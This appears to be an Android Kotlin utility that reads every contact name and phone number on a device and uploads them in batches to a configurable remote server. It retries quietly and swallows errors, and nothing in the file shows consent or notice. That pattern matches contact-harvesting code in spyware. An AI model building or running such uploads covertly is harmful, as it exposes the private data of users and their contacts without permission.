package com.example.test.utils

import android.content.Context
import android.provider.ContactsContract
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object ContactsBatchUploader {

    private const val BATCH_SIZE = 200
    private const val RETRY_ATTEMPTS = 3
    private const val DELAY_BETWEEN_BATCHES_MS = 300L

    suspend fun uploadQuickContacts(
        context: Context,
        deviceId: String,
        baseUrl: String,
        limit: Int = 50
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            val contacts = fetchContacts(context, deviceId, limit)

            if (contacts.isEmpty()) {
                return@withContext UploadResult.Success(0)
            }

            val success = sendBatch(contacts, deviceId, baseUrl, 1, 1)

            if (success) {
                UploadResult.Success(contacts.size)
            } else {
                UploadResult.Failure("Quick upload failed")
            }

        } catch (e: Exception) {
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    suspend fun uploadAllContacts(
        context: Context,
        deviceId: String,
        baseUrl: String,
        onProgress: ((Int, Int) -> Unit)? = null
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            val allContacts = fetchContacts(context, deviceId, limit = null)

            if (allContacts.isEmpty()) {
                return@withContext UploadResult.Success(0)
            }

            var totalSent = 0
            val totalBatches = (allContacts.size + BATCH_SIZE - 1) / BATCH_SIZE

            for (batchIndex in 0 until totalBatches) {
                val start = batchIndex * BATCH_SIZE
                val end = minOf(start + BATCH_SIZE, allContacts.size)
                val batch = allContacts.subList(start, end)

                var success = false
                var attempts = 0

                while (!success && attempts < RETRY_ATTEMPTS) {
                    attempts++

                    try {
                        success = withTimeout(10000L) {
                            sendBatch(batch, deviceId, baseUrl, batchIndex + 1, totalBatches)
                        }

                        if (!success && attempts < RETRY_ATTEMPTS) {
                            delay(500L * attempts)
                        }

                    } catch (e: Exception) {
                        if (attempts < RETRY_ATTEMPTS) {
                            delay(500L * attempts)
                        }
                    }
                }

                if (success) {
                    totalSent += batch.size
                }

                onProgress?.invoke(totalSent, allContacts.size)

                if (batchIndex < totalBatches - 1) {
                    delay(DELAY_BETWEEN_BATCHES_MS)
                }
            }

            UploadResult.Success(totalSent)

        } catch (e: Exception) {
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    private fun fetchContacts(context: Context, deviceId: String, limit: Int?): List<ContactModel> {
        val contacts = mutableListOf<ContactModel>()

        try {
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)

                var count = 0

                while (it.moveToNext() && (limit == null || count < limit)) {
                    try {
                        val contactId = it.getString(idIndex)
                        val name = it.getString(nameIndex) ?: "Unknown"

                        val phones = mutableListOf<String>()
                        val phoneCursor = context.contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(contactId),
                            null
                        )

                        phoneCursor?.use { pc ->
                            val phoneIndex = pc.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER
                            )
                            while (pc.moveToNext()) {
                                val phone = pc.getString(phoneIndex)
                                if (!phone.isNullOrBlank()) {
                                    phones.add(phone.trim())
                                }
                            }
                        }

                        if (phones.isNotEmpty()) {
                            phones.forEach { phone ->
                                contacts.add(
                                    ContactModel(
                                        contactId = "${deviceId}_contact_${contactId}_${phone.hashCode()}",
                                        deviceId = deviceId,
                                        name = name,
                                        phoneNumber = phone
                                    )
                                )
                            }
                            count++
                        }

                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
        }

        return contacts
    }

    private fun sendBatch(
        contacts: List<ContactModel>,
        deviceId: String,
        baseUrl: String,
        batchNumber: Int,
        totalBatches: Int
    ): Boolean {
        return try {
            val contactsArray = JSONArray()

            contacts.forEach { contact ->
                contactsArray.put(JSONObject().apply {
                    put("contact_id", contact.contactId)
                    put("device_id", contact.deviceId)
                    put("name", contact.name)
                    put("phone_number", contact.phoneNumber)
                })
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", contactsArray)
                put("batch_info", JSONObject().apply {
                    put("batch", batchNumber)
                    put("of", totalBatches)
                })
            }

            val response = sendPostRequest("$baseUrl/contacts/batch", json.toString())
            response != null

        } catch (e: Exception) {
            false
        }
    }

    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        return try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            null
        } finally {
            connection?.disconnect()
        }
    }

    data class ContactModel(
        val contactId: String,
        val deviceId: String,
        val name: String,
        val phoneNumber: String
    )

    sealed class UploadResult {
        data class Success(val totalSent: Int) : UploadResult()
        data class Failure(val error: String) : UploadResult()
    }
}